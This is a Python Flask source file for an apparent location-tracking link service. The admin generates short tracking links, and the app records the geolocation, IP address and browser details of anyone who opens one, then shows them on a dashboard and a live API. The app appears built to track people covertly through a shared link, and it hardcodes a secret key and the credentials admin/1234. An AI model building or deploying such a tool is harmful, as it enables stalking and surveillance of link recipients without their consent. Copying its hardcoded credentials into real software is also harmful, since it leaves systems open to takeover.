from flask import Flask, render_template, request, redirect, url_for
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user
import sqlite3, uuid
from datetime import datetime

app = Flask(__name__)
app.secret_key = "haider_secret_key"

login_manager = LoginManager()
login_manager.init_app(app)

# Dummy admin user
class User(UserMixin):
    def __init__(self, id):
        self.id = id

@login_manager.user_loader
def load_user(user_id):
    return User(user_id)

# Init DB
def init_db():
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id TEXT, lat TEXT, lon TEXT, ip TEXT, agent TEXT, time TEXT)''')
    conn.commit()
    conn.close()

init_db()

# LOGIN
@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if username == "admin" and password == "1234":
            user = User(id=1)
            login_user(user)
            return redirect('/dashboard')
    return render_template("login.html")

# DASHBOARD
@app.route('/dashboard')
@login_required
def dashboard():
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("SELECT * FROM locations")
    data = c.fetchall()
    conn.close()
    return render_template("dashboard.html", data=data)

# GENERATE LINK (UPDATED WITH BUTTON PAGE)
@app.route('/')
@login_required
def home():
    uid = str(uuid.uuid4())[:8]
    full_link = request.host_url + "track/" + uid
    return render_template("index.html", link=full_link)

# TRACK PAGE
@app.route('/track/<id>')
def track(id):
    return render_template("track.html", id=id)

# SAVE LOCATION
@app.route('/save/<id>', methods=['POST'])
def save(id):
    data = request.get_json()
    lat = data['lat']
    lon = data['lon']

    ip = request.remote_addr
    agent = request.headers.get('User-Agent')
    time = datetime.now()

    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("INSERT INTO locations VALUES (?,?,?,?,?,?)",
              (id, lat, lon, ip, agent, time))
    conn.commit()
    conn.close()

    return {"status":"ok"}

# LIVE DATA API
@app.route('/api/data')
@login_required
def api_data():
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("SELECT lat, lon FROM locations")
    data = c.fetchall()
    conn.close()
    return {"locations": data}

# LOGOUT
@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect('/login')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)